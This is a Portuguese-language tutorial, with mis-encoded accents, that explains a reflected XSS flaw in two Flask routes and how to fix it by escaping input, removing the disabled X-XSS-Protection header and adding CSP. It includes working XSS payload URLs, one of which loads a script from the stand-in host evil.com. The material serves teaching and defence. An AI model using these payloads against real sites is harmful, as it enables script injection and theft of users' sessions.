## ğŸ”¹ Como a vulnerabilidade ocorre?

No cÃ³digo fornecido:

```python
@app.route('/', methods=['GET', 'POST'])
def home():
  user_input = request.form.get('reflected', '')
  resp = make_response(render_template('index.html', user_input=user_input))
  resp.headers['X-XSS-Protection'] = '0'
  return resp

@app.route('/search/<path:title>')
def search(title):
  resp = make_response(render_template('search.html', title=title))
  resp.headers['X-XSS-Protection'] = '0'
  return resp
```

### Problemas:

1. **Entrada do usuÃ¡rio (`user_input` e `title`) Ã© inserida diretamente no template sem escape.**
   Isso permite injetar HTML/JS, como:

   ```
   /search/<script>alert(1)</script>
   ```

   ou versÃ£o URL-encoded:

   ```
   /search/%3Cscript%3Ealert(1)%3C/script%3E
   ```

2. O header **X-XSS-Protection = 0** desativa a proteÃ§Ã£o de alguns navegadores antigos.

3. O parÃ¢metro `<path:title>` permite que o usuÃ¡rio insira barras (`/`), o que facilita a criaÃ§Ã£o de payloads maliciosos, como:

   ```
   /search/<script src=https://evil.com/payload.js></script>
   ```

---

## ğŸ”¹ Como explorar?

âœ… Basta acessar uma URL como:

```
http://localhost:5000/search/<script>alert('XSS')</script>
```

âœ… TambÃ©m Ã© possÃ­vel carregar scripts externos:

```
http://localhost:5000/search/<script src=https://evil.com/payload.js></script>
```

---

## ğŸ”¹ Como corrigir?

### âœ… 1. Remover cabeÃ§alho inseguro

Remover as linhas:

```python
resp.headers['X-XSS-Protection'] = '0'
```

### âœ… 2. Usar `escape()` no input do usuÃ¡rio

No topo do cÃ³digo:

```python
from flask import escape
```

E alterar as rotas:

```python
@app.route('/', methods=['GET', 'POST'])
def home():
  user_input = request.form.get('reflected', '')
  user_input = escape(user_input)  # Escapa caracteres perigosos
  return render_template('index.html', user_input=user_input)

@app.route('/search/<path:title>')
def search(title):
  title = escape(title)  # Escapa o tÃ­tulo
  return render_template('search.html', title=title)
```

---

## ğŸ”¹ Resultado esperado

* Ao acessar `/search/<script>alert(1)</script>`, a pÃ¡gina exibirÃ¡:

  ```
  &lt;script&gt;alert(1)&lt;/script&gt;
  ```

  e **nÃ£o executarÃ¡ o cÃ³digo JS**.

---

## ğŸ”¹ Melhorias adicionais

âœ… Alterar a rota para `'/search/<title>'` (sem `path:`) se nÃ£o for necessÃ¡rio permitir barras.
âœ… Se quiser permitir `/` no parÃ¢metro, manter `path:title` **apÃ³s escapar a entrada**.
âœ… Usar **Content Security Policy (CSP)** para impedir a execuÃ§Ã£o de scripts inline.
